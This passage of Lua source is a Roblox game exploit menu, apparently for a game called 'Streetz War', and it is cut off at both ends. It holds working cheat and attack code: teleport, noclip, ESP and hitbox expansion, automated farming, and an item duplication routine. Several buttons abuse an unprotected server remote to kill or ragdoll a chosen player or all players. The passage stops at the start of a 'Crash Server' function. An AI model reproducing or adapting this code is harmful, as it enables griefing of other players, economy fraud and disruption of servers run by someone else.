                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = purchaseditem.Parent.MainPart.CFrame
                    wait(0.2)
                    purchaseditem.Parent.MainPart.ProximityPrompt.MaxActivationDistance = 10
                    purchaseditem.Parent.MainPart.ProximityPrompt.RequiresLineOfSight = false
                    repeat 
                        game.Workspace.Camera.CameraType = Enum.CameraType.Scriptable 
                        task.wait(.5) 
                    until game.Workspace.Camera.CameraType == Enum.CameraType.Scriptable
                    
                    -- Function to make camera look at a position or object
                    local function LookAtObject(target)
                        -- Calculate the position to look at (center of the object)
                        local lookAtPosition = target.Position
                        
                        -- Get the current camera object
                        local camera = game.Workspace.CurrentCamera
                        
                        -- Calculate the new CFrame for the camera to look at the target with closer zoom
                        local newCameraCFrame = CFrame.new(
                            lookAtPosition + Vector3.new(0, 5, -1),  -- Position the camera closer to the object
                            lookAtPosition  -- Keep the camera centered on the target object
                        )
                        
                        -- Set the camera's CFrame to look at the target
                        camera.CFrame = newCameraCFrame
                    end
                    
                    -- Call the function to make the camera look at the target object
                    LookAtObject(purchaseditem.Parent.MainPart)
                    wait(2)
    
                    
                    fireproximityprompt(purchaseditem.Parent.MainPart.ProximityPrompt, purchaseditem.Parent.MainPart.ProximityPrompt.HoldDuration + 0.2)
                    wait(purchaseditem.Parent.MainPart.ProximityPrompt.HoldDuration + 0.2)
                    repeat 
                        game.Workspace.Camera.CameraType = Enum.CameraType.Custom 
                        task.wait(.5) 
                    until game.Workspace.Camera.CameraType == Enum.CameraType.Custom
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                end
            end
        end
    end)
    

    local playerssector = section5.new_sector('Players', 'Right')
    local amount = 5000
    local method = "public"
    local ammo = 5000
    local namechange = ""





        local playerteleport = nil
    local playertextbox = playerssector.element('TextBox', 'Player Name', nil, function(v)
        playerteleport = v.Text
     end)

    local tpbutton = playerssector.element('Button', 'Teleport', false, function(v)
        if playerteleport ~= nil then
        local player = game.Players:FindFirstChild(playerteleport)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end)







    local teleportlocation

    -- Function to create the dropdown and handle teleportation
    local function createDropdownAndTeleport()
        local options = {}
    
        -- Populate options from map locations
        for _, mapLocation in pairs(game.Workspace.MapsLocations:GetChildren()) do
            if mapLocation:FindFirstChild("BillboardGui") and mapLocation.BillboardGui:FindFirstChild("Main") and mapLocation.BillboardGui.Main:FindFirstChild("Emoji") then
                local emojiText = mapLocation.BillboardGui.Main.Emoji.Text
                table.insert(options, emojiText)
            end
        end
    
        -- Assuming teleports.element creates a GUI dropdown and invokes a callback on selection
        local tpdropdown = teleports.element('Dropdown', 'Location', {
            options = options
        }, function(v)
            for _, mapLocation in pairs(game.Workspace.MapsLocations:GetChildren()) do
                if mapLocation:FindFirstChild("BillboardGui") and mapLocation.BillboardGui:FindFirstChild("Main") and mapLocation.BillboardGui.Main:FindFirstChild("Emoji") then
                    local emojiText = mapLocation.BillboardGui.Main.Emoji.Text
                    if emojiText == v.Dropdown then
                        teleportlocation = mapLocation
                        break  -- Exit loop once location is found
                    end
                end
            end
        end)
    end
    
    -- Call the function to create the dropdown and handle teleportation
    createDropdownAndTeleport()
    

    local tpbutton = teleports.element('Button', 'Teleport', false, function(v)
        if teleportlocation ~= nil then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = teleportlocation.CFrame
        else
            local LoadingXSX = Notif:Notify("You need to choose a location!", 2, "information") -- notification, alert, error, success, information
        end
    end)

    local walkspeedslider = selfsector.element('Slider', 'WalkSpeed', {default = {min = 1, max = 80, default = 5}}, function(v)
        _G.desiredwalkspeed = v.Slider
        game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
            if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= _G.desiredwalkspeed then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.desiredwalkspeed -- Reset to desired walk speed
            end
        end)
    
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.desiredwalkspeed
     end)

     local jumppowerslider = selfsector.element('Slider', 'JumpPower', {default = {min = 1, max = 500, default = 40}}, function(v)
        _G.desiredjumppower = v.Slider
        game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
            if game.Players.LocalPlayer.Character.Humanoid.JumpPower ~= _G.desiredjumppower then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = _G.desiredjumppower -- Reset to desired walk speed
            end
        end)
    
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = _G.desiredjumppower
     end)


    local flytoggle = selfsector.element('Toggle', 'Flying', false, function(v)
        _G.flying = v.Toggle
        if v.Toggle then
            local LoadingXSX = Notif:Notify("Fly Started", 2, "information") -- notification, alert, error, success, information
        else
            local LoadingXSX = Notif:Notify("Fly Stopped", 2, "information") -- notification, alert, error, success, information
        end
    end)

    
    local flytoggle = autofarmsector.element('Toggle', 'Mop Autofarm', false, function(v)
        _G.automopfarm = v.Toggle
while _G.automopfarm do
for i,v in pairs(game.Workspace.CleanPart:GetChildren()) do
    if v.ProximityPrompt.Enabled == true then
    v.ProximityPrompt.HoldDuration = 1
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
    wait(0.1)
    fireproximityprompt(v.ProximityPrompt, v.ProximityPrompt.HoldDuration, false)
        wait(v.ProximityPrompt.HoldDuration + 0.2 + 2)
    end
    end
end
end)


local flytoggle = autofarmsector.element('Toggle', 'Box Autofarm', false, function(v)
    _G.autoboxfarm = v.Toggle
    
    -- Coroutine for boxing
    task.spawn(function()
        print("Boxing coroutine started")
        while _G.autoboxfarm do
            local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
            wait(0.1)
            fireclickdetector(game.Workspace.Job.Box.BOX1.ClickDetector)
            wait(0.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
            game.Players.LocalPlayer.Backpack:WaitForChild("Box").Parent = game.Players.LocalPlayer.Character
            firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 0)
            wait()
            firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 1)
            wait(15)
            print("Boxing task done")
            wait(0.1) -- Yield control to prevent freezing
        end
        print("Boxing coroutine stopped")
    end)
end)


local cardautofarm = autofarmsector.element('Toggle', 'Card Autofarm', false, function(v)
    _G.cardautofarm = v.Toggle
while _G.cardautofarm do
wait(1)
fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-55.2443771, 4.57027864, 170.608994, -0.15382807, -8.42419112e-08, -0.988097608, 7.36582173e-09, 1, -8.64033822e-08, 0.988097608, -2.05694164e-08, -0.15382807)

wait(0.5)


local vim = game:GetService("VirtualInputManager")
local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame["Blank Card"]
thing.Size = UDim2.new(10, 0, -10, 0)

wait(0.5)
    task.wait(0.1)
mousemoveabs(thing.AbsolutePosition.X,thing.AbsolutePosition.Y)
vim:SendMouseButtonEvent(thing.AbsolutePosition.X,thing.AbsolutePosition.Y, 0, true, game, 0)
wait()
vim:SendMouseButtonEvent(thing.AbsolutePosition.X,thing.AbsolutePosition.Y, 0, false, game, 0)
thing.Size = UDim2.new(0, 0, 0, 0)
local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame["laptop"]
thing.Size = UDim2.new(10, 0, -10, 0)
wait(2)
    task.wait(0.1)
mousemoveabs(thing.AbsolutePosition.X,thing.AbsolutePosition.Y)
vim:SendMouseButtonEvent(thing.AbsolutePosition.X,thing.AbsolutePosition.Y, 0, true, game, 0)
wait()
vim:SendMouseButtonEvent(thing.AbsolutePosition.X,thing.AbsolutePosition.Y, 0, false, game, 0)
thing.Size = UDim2.new(0, 0, 0, 0)

local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
thing.Size = UDim2.new(10, 0, -10, 0)

mousemoveabs(thing.AbsolutePosition.X,thing.AbsolutePosition.Y)
vim:SendMouseButtonEvent(thing.AbsolutePosition.X,thing.AbsolutePosition.Y, 0, true, game, 0)
wait()
vim:SendMouseButtonEvent(thing.AbsolutePosition.X,thing.AbsolutePosition.Y, 0, false, game, 0)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-5.82215214, 58.6855545, 177.927963, 0.758703411, -1.90383407e-08, -0.65143621, 4.84420104e-09, 1, -2.35833202e-08, 0.65143621, 1.47370578e-08, 0.758703411)
wait(0.5)



wait(4)
	game.Players.LocalPlayer.Backpack.Laptop.Parent = game.Players.LocalPlayer.Character
wait(0.2)
spawn(function()
    local args = {
        [1] = true,
        [2] = "NEW123"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("Other"):WaitForChild("GiverPunchmade"):InvokeServer(unpack(args))
end)

    wait(2)

spawn(function()
    local args = {
        [1] = false,
        [2] = "NEW123"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("Other"):WaitForChild("GiverPunchmade"):InvokeServer(unpack(args))
end)
wait(2)
end
end)

local laptopamount5 = nil
local cardamount = carddupingsector.element('TextBox', 'Dupe Amount', nil, function(v)
    cardamount5 = tonumber(v.Text)
end)

local flytoggle = carddupingsector.element('Button', 'Dupe Cards', false, function(v)
    if cardamount5 ~= nil then
        -- Activate the click detector for Anonymous
        fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
    
        -- Show and hide the DealerGui frames
        game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
        game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
        game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
        -- Move the player to the specified position
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-55.2443771, 4.57027864, 170.608994, -0.15382807, -8.42419112e-08, -0.988097608, 7.36582173e-09, 1, -8.64033822e-08, 0.988097608, -2.05694164e-08, -0.15382807)
    
        wait(0.5)
    
        -- VirtualInputManager for simulating clicks
        local vim = game:GetService("VirtualInputManager")
    
        -- Click both the "Blank Card" and "laptop" buttons simultaneously
        local card = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame["Blank Card"]
        local laptop = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame["laptop"]
    
        -- Spawn a parallel task for card clicks
        game:GetService("RunService"):Set3dRenderingEnabled(false)
            for i = 1, cardamount5 * 1.3 do
                task.wait()
                vim:SendMouseButtonEvent(card.AbsolutePosition.X + 5, card.AbsolutePosition.Y + 70, 0, true, game, 0)
                task.wait()
                vim:SendMouseButtonEvent(card.AbsolutePosition.X + 5, card.AbsolutePosition.Y + 70, 0, false, game, 0)
                task.wait()
                vim:SendMouseButtonEvent(laptop.AbsolutePosition.X + 5, laptop.AbsolutePosition.Y + 70, 0, true, game, 0)
                task.wait()
                vim:SendMouseButtonEvent(laptop.AbsolutePosition.X + 5, laptop.AbsolutePosition.Y + 70, 0, false, game, 0)
            end
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        -- Exit button click after both tasks finish
        wait()
        local exitButton = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
        vim:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 5, exitButton.AbsolutePosition.Y + 45, 0, true, game, 0)
        wait()
        vim:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 5, exitButton.AbsolutePosition.Y + 45, 0, false, game, 0)
    
        -- Move the player to the new location
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(954.698547, 4.71228409, -61.4266853, 0.999067187, 9.48438483e-08, -0.0431831107, -9.68137286e-08, 1, -4.35256844e-08, 0.0431831107, 4.76658002e-08, 0.999067187)
        wait(4)
    
        local laptopcount = 0 
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    if v.Name == "Laptop" then
        laptopcount = laptopcount + 1
    end
    end
for i = 1, laptopcount - 1 do
spawn(function()
local args = {
    [1] = true,
    [2] = "NEW123"
}

game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("Other"):WaitForChild("GiverPunchmade"):InvokeServer(unpack(args))
end)
    end
    wait(4)
    game.Players.LocalPlayer.Backpack.Laptop.Parent = game.Players.LocalPlayer.Character
    wait(4)


    local cardcount = 0 
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    if v.Name == "Loaded Card" then
        cardcount = cardcount + 1
    end
    end


    for i = 1, cardcount do
spawn(function()
local args = {
    [1] = false,
    [2] = "NEW123"
}

game:GetService("ReplicatedStorage"):WaitForChild("Assets"):WaitForChild("Other"):WaitForChild("GiverPunchmade"):InvokeServer(unpack(args))
end)
    end
end
game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
end)



    local nocliptoggle = selfsector.element('Toggle', 'Noclip', false, function(v)
        _G.noclip = v.Toggle

        if not _G.noclip then
                        local character = game.Players.LocalPlayer.Character
                    if character then
                        for _, part in pairs(character:GetDescendants()) do
                            if part:IsA("BasePart") and part.Parent.Name ~= "Wings" then
                                part.CanCollide = true
                            end
                        end
                    end
        end
        
        while _G.noclip do
            game:GetService("RunService").RenderStepped:wait()
                    local character = game.Players.LocalPlayer.Character
                    if character then
                        for _, part in pairs(character:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                    end
                end
    end)

    local disablejump = selfsector.element('Button', 'Disable Jump Cooldown', false, function(v)
        local debounce = false

game:GetService("UserInputService").JumpRequest:Connect(function()
    if not debounce then
        debounce = true
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        wait(0.5)  -- Adjust the wait time as needed for the debounce
        debounce = false
    end
end)
    end)


    local disablejump = selfsector.element('Button', 'Remove Limbs', false, function(v)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:FindFirstChild("Humanoid")

if humanoid then
    game:GetService("ReplicatedStorage").Ragdoll:FireServer(true)
game.Players.LocalPlayer.Character.Humanoid.Jump = true
    humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
    workspace.sw2accountmod.Humanoid.RequiresNeck = false 
end
        -- Store the player's original position
        local originalPosition = humanoidRootPart.Position
        
        -- Teleport the player high in the sky
        humanoidRootPart.CFrame = CFrame.new(originalPosition.X, originalPosition.Y + 5000, originalPosition.Z)
        
        -- Disable all ragdoll constraints
        local ragdollFolder = character:FindFirstChild("RagdollConstraints")
        
        if ragdollFolder then
            -- Iterate through all constraints in the folder
            for _, constraint in ipairs(ragdollFolder:GetChildren()) do
                if constraint:IsA("HingeConstraint") or constraint:IsA("BallSocketConstraint") then
                    -- Disable the constraint
                    constraint.Enabled = false
                end
            end
        end
        
        -- Run your desired code here (e.g., wait for a few seconds)
        wait(2) -- Example wait time for running other code or actions
        
        -- Teleport the player back to their original position
        humanoidRootPart.CFrame = CFrame.new(originalPosition)
        player.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end)

    local tpbutton = selfsector.element('Button', 'Godmode', false, function(v)
        -- sw2 godmode
game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(game.Players.LocalPlayer.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
wait(0.5)
local Health = Notif:Notify("New Health: " .. tostring(game.Players.LocalPlayer.Character.Humanoid.Health), 4, "information")
    end)

    

    -- // Elements \\ -- (Type, Name, State, Callback)
    local ammoslider = sector3.element('Slider', 'Ammo', {default = {min = 1, max = 10000, default = 5000}}, function(v)
       ammo = v.Slider
        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool then
        if tool:FindFirstChild("Stuff") then
            tool.Stuff.Values.CurrentAmmo.MaxValue = 100000000000000
        tool.Stuff.Values.StoredAmmo.MaxValue = 100000000000000
    
            tool.Stuff.Values.CurrentAmmo.MinValue = 0
        tool.Stuff.Values.StoredAmmo.MinValue = 0
    
        tool.Stuff.Values.CurrentAmmo.Value = ammo
        tool.Stuff.Values.StoredAmmo.Value = ammo
        end
        end
    end)

    local tracertoggle = sector3.element('Toggle', 'Tracers', false, function(v)
        _G.tracers = v.Toggle
    end)


    
    
    local toggle = sector3.element('Button', 'Unlock Firerate', false, function(v)

        local referencemodule = game.ReplicatedStorage.Assets.Tools["Custom GD"]

        if not referencemodule then
            warn("reference module not found")
            return
        end
        
        for _, v in pairs(game.ReplicatedStorage.Assets.Tools:GetChildren()) do
            local newv = referencemodule:Clone()
            newv.Parent = game.ReplicatedStorage.Assets.Tools
            newv.Name = v.Name
            local existingSounds = newv:FindFirstChild("Sounds")
            if existingSounds then
                existingSounds:Destroy()
            end
            local oldSounds = v:FindFirstChild("Sounds")
            if oldSounds then
                oldSounds.Parent = newv
            end
            v:Destroy()
        end

        _G.FixingName = true
        while _G.FixingName do
            wait()
            if game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
        game.Players.LocalPlayer.PlayerGui.GunUI.GunStats.Weapon.Text = "Modded " .. game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        end
        end
    end)

    


        -- // Elements \\ -- (Type, Name, State, Callback)
        local ammoslider = section4.element('Slider', 'HBE', {default = {min = 2, max = 30, default = 2}}, function(v)
            local size = v.Slider

            for i,v in pairs(game.Players:GetChildren()) do
                if v.Character and v ~= game.Players.LocalPlayer then
                    if v.Character:FindFirstChild("HumanoidRootPart") then
                        v.Character.HumanoidRootPart.Size = Vector3.new(size, size, size)
                        v.Character.HumanoidRootPart.Transparency = 0.8
                        v.Character.HumanoidRootPart.Color = Color3.new(0.3921568627,0.3921568627,1)
                       v.Character.HumanoidRootPart.CanCollide = false
                    end
                end
            end
         end)

         local esptoggle = section4.element('Toggle', 'ESP', false, function(v)
            _G.EspEnabled = v.Toggle

            local Players = game:GetService("Players")
            local localPlayer = Players.LocalPlayer
            local localCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            local localRootPart = localCharacter:WaitForChild("HumanoidRootPart")
            
            local holder = game.CoreGui:FindFirstChild("ESPHolder") or Instance.new("Folder")
            if _G.EspEnabled == false then holder:Destroy() end
            if holder.Name == "Folder" then
                holder.Name = "ESPHolder"
                holder.Parent = game.CoreGui
            end
            
            if _G.EspEnabled == true then
                _G.EspEnabled = false
                _G.EspEnabled = true
            end
            
            while _G.EspEnabled do
                task.wait()
                for _, v in pairs(Players:GetChildren()) do
                    if v.Name ~= localPlayer.Name then
                        local chr = v.Character
                        if chr then
                            local targetRootPart = chr:FindFirstChild("HumanoidRootPart")
                            if targetRootPart then
                                local distance = (localRootPart.Position - targetRootPart.Position).Magnitude
                                if distance < 200 then
                                    local esp = holder:FindFirstChild(v.Name) or Instance.new("Highlight")
                                    esp.Name = v.Name
                                    esp.Parent = holder
                                    esp.FillColor = Color3.new(0.3921568627, 0.3921568627, 1)
                                    esp.OutlineColor = Color3.new(0.3921568627, 0.3921568627, 1)
                                    esp.FillTransparency = 0.8
                                    esp.OutlineTransparency = 0.4
                                    esp.Adornee = chr
                                    esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                                    
                                    local billboard = holder:FindFirstChild("Billboard_" .. v.Name) or Instance.new("BillboardGui")
                                    billboard.Name = "Billboard_" .. v.Name
                                    billboard.Parent = holder
                                    billboard.Adornee = targetRootPart
                                    billboard.Size = UDim2.new(0, 200, 0, 60)
                                    billboard.StudsOffset = Vector3.new(0, 5, 0)
                                    billboard.AlwaysOnTop = true
                                    
                                    local nameLabel = billboard:FindFirstChild("NameLabel") or Instance.new("TextLabel")
                                    nameLabel.Name = "NameLabel"
                                    nameLabel.Parent = billboard
                                    nameLabel.Size = UDim2.new(1, 0, 0.3, 0)
                                    nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
                                    nameLabel.BackgroundTransparency = 1
                                    nameLabel.Text = v.Name
                                    nameLabel.TextColor3 = Color3.new(1, 1, 1)
                                    nameLabel.TextStrokeTransparency = 0
                                    nameLabel.Font = Enum.Font.ArialBold
            
                                    local health = chr:FindFirstChild("Humanoid")
                                    if health then
                                        local healthLabel = billboard:FindFirstChild("HealthLabel") or Instance.new("TextLabel")
                                        healthLabel.Name = "HealthLabel"
                                        healthLabel.Parent = billboard
                                        healthLabel.Size = UDim2.new(1, 0, 0.3, 0)
                                        healthLabel.Position = UDim2.new(0, 0, 0.3, 0)
                                        healthLabel.BackgroundTransparency = 1
                                        healthLabel.Text = "Health: " .. math.floor(health.Health)
                                        healthLabel.TextColor3 = Color3.new(1, 1, 1)
                                        healthLabel.TextStrokeTransparency = 0
                                        healthLabel.Font = Enum.Font.ArialBold
                                        
                                        local distanceLabel = billboard:FindFirstChild("DistanceLabel") or Instance.new("TextLabel")
                                        distanceLabel.Name = "DistanceLabel"
                                        distanceLabel.Parent = billboard
                                        distanceLabel.Size = UDim2.new(1, 0, 0.3, 0)
                                        distanceLabel.Position = UDim2.new(0, 0, 0.45, 0)
                                        distanceLabel.BackgroundTransparency = 1
                                        distanceLabel.Text = "Distance: " .. math.floor(distance)
                                        distanceLabel.TextColor3 = Color3.new(1, 1, 1)
                                        distanceLabel.TextStrokeTransparency = 0
                                        distanceLabel.Font = Enum.Font.ArialBold
                                    end
                                else
                                    local existingEsp = holder:FindFirstChild(v.Name)
                                    if existingEsp then existingEsp:Destroy() end
                                    local existingBillboard = holder:FindFirstChild("Billboard_" .. v.Name)
                                    if existingBillboard then existingBillboard:Destroy() end
                                end
                            end
                        end
                    end
                end
            end
        end)

-- Define local variables
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local torso = character:WaitForChild("HumanoidRootPart")
local runService = game:GetService("RunService")
local distance = 6 -- Distance from the player

-- Table to store the bricks
local bricks = {}
local bricksCreated = false -- Flag to check if bricks have been created

-- Function to generate a random string
local function generateRandomName(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local name = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        name = name .. chars:sub(rand, rand)
    end
    return name
end

-- Function to create the bricks
local function createBricks()
    if not bricksCreated then
        for i = 1, 30 do
            local brick = Instance.new("Part")
            brick.Size = Vector3.new(1, 1, 1)
            brick.Material = Enum.Material.ForceField
            brick.Color = Color3.new(0.3921568627, 0.3921568627, 1) -- Custom Color3 value
            brick.Anchored = false
            brick.CanCollide = false
            brick.Name = "killaura_" .. generateRandomName(8) -- Random name for uniqueness
            brick.Parent = workspace
            brick.Transparency = 1
            -- Position the bricks randomly around the player
            local angle = math.rad((i / 30) * 360) -- Evenly spaced angles
            local xOffset = math.cos(angle) * distance
            local zOffset = math.sin(angle) * distance

            brick.Position = torso.Position + Vector3.new(xOffset, 2, zOffset)

            -- Set the initial velocity of the bricks
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
            bodyVelocity.Velocity = Vector3.new(0, 10, 0)
            bodyVelocity.Parent = brick

            -- Add the brick to the table
            table.insert(bricks, brick)
        end
        bricksCreated = true
    end
end

-- Function to set bricks visibility
local function setBricksVisibility(visible)
    for _, brick in ipairs(bricks) do
        if brick then
            brick.Transparency = visible and 0 or 1
            brick.CanCollide = visible
        end
    end
end

-- Function to update brick positions
local function updateBricksPosition()
    local rotationSpeed = 2 -- Speed of rotation
    for i, brick in ipairs(bricks) do
        local angle = (i / 30) * 2 * math.pi + (rotationSpeed * tick() % (2 * math.pi))
        local xOffset = math.cos(angle) * distance
        local zOffset = math.sin(angle) * distance
        local yOffset = 2 -- Height offset from the player
        
        brick.Position = torso.Position + Vector3.new(xOffset, yOffset, zOffset)
    end
end

-- Initial brick creation
createBricks()

local function killaura()
    local players = game.Players:GetPlayers()
    for _, otherPlayer in ipairs(players) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = otherPlayer.Character.HumanoidRootPart.Position
            local playerPosition = torso.Position
            local distanceToPlayer = (targetPosition - playerPosition).magnitude
            
            if distanceToPlayer <= distance then
                -- Fire the server event if within distance
                local fist = player.Backpack:FindFirstChild("Fist")
                if fist and fist:FindFirstChild("Script") then
                    fist.Script.egma:FireServer(otherPlayer.Character.UpperTorso, 100, player.Character.RightHand)
                end
            end
        end
    end
end

local function healaura()
    local players = game.Players:GetPlayers()
    for _, otherPlayer in ipairs(players) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = otherPlayer.Character.HumanoidRootPart.Position
            local playerPosition = torso.Position
            local distanceToPlayer = (targetPosition - playerPosition).magnitude
            
            if distanceToPlayer <= distance then
                -- Fire the server event if within distance
                local fist = player.Backpack:FindFirstChild("Fist")
                if fist and fist:FindFirstChild("Script") then
                    fist.Script.egma:FireServer(otherPlayer.Character.UpperTorso, -10, player.Character.RightHand)
                end
            end
        end
    end
end
if premium then
-- Toggle handling
local esptoggle = section4.element('Toggle', 'Kill Aura', false, function(v)
    _G.killauracircle = v.Toggle -- Update global toggle state (renamed variable for consistency)

    if _G.killauracircle then
        -- Set bricks visible and update positions
        setBricksVisibility(true)
        spawn(function()
            while _G.killauracircle do
                task.wait()
                updateBricksPosition()
                killaura()
            end
        end)
    else
        -- Set bricks invisible and stop the loop
        _G.killauracircle = false
        setBricksVisibility(false)
    end
end)

local esptoggle = section4.element('Toggle', 'Heal Aura', false, function(v)
    _G.healauracircle = v.Toggle -- Update global toggle state (renamed variable for consistency)

    if _G.healauracircle then
        -- Set bricks visible and update positions
        setBricksVisibility(true)
        spawn(function()
            while _G.healauracircle do
                task.wait()
                updateBricksPosition()
                healaura()
            end
        end)
    else
        -- Set bricks invisible and stop the loop
        _G.killauracircle = false
        setBricksVisibility(false)
    end
end)
end    

       local crashtarget = nil
       local playertextbox = section4.element('TextBox', 'Player Name', nil, function(v)
        crashtarget = v.Text
     end)

     local toggle = section4.element('Button', 'Kill Player', false, function(v)
        local target = game.Players[crashtarget]
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
            wait(2)
            local Health = Notif:Notify("Targets Health: " .. tostring(target.Character.Humanoid.Health), 4, "information")
    end)

    if premium then
    local toggle = section4.element('Button', 'Godmode Player', false, function(v)
        local target = game.Players[crashtarget]
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(target.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            wait(2)
            local Health = Notif:Notify("Targets Health: " .. tostring(target.Character.Humanoid.Health), 4, "information")
    end)
    
    local toggle = section4.element('Button', 'Godmode All', false, function(v)
        for i,v in pairs(game.Players:GetChildren()) do
            wait(0.3)
            print(v.Name)
            game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            end
            local Health = Notif:Notify("Attempted to godmode all", 4, "information")
    end)
    
    local toggle = section4.element('Button', 'Kill all', false, function(v)
        for i,v in pairs(game.Players:GetChildren()) do
            wait(0.3)
            if v.Name ~= game.Players.LocalPlayer.Name then
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, v.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
            end
            end
            local Health = Notif:Notify("Attempted to kill all", 4, "information")
end)

local toggle = section4.element('Button', 'Ragdoll all', false, function(v)
    local tool = nil
    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if v:FindFirstChild("Stuff") then
            tool = v
        end
        end
    if tool == nil then
        local Health = Notif:Notify("No gun in inventory", 4, "information")
    else
        for i,v in pairs(game:GetService("ReplicatedStorage").Communication.Events:GetChildren()) do
                v.Name = i
            end
            
            tool.Parent  = game.Players.LocalPlayer.Character
            wait()
            for i,v in pairs(game.Players:GetChildren()) do
                if v.Character then
                    if v.Name ~= game.Players.LocalPlayer.Name then
                        local args = {
                            [1] = tool,
                            [2] = v.Character.RightLowerLeg,
                            [3] = Vector3.new(2573.336669921875, -305.27593994140625, -161.96495056152344),
                            [4] = Vector3.yAxis,
                            [5] = Vector3.new(0.335058331489563, -0.1915476769208908, -0.9225212335586548)
                        }
                    
                        game:GetService("ReplicatedStorage"):WaitForChild("Communication"):WaitForChild("Events"):WaitForChild("3"):FireServer(unpack(args))
                        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -20, game.Players.LocalPlayer.Character.RightHand)
                    end         
            end
            end
            wait(1)
            tool.Parent = game.Players.LocalPlayer.Backpack
            local Health = Notif:Notify("Ragdolled all players", 4, "information")
            end
end)
    
local toggle = section4.element('Button', 'Crash Server (requires 300k)', false, function(v)
    local dupeamount = 2000
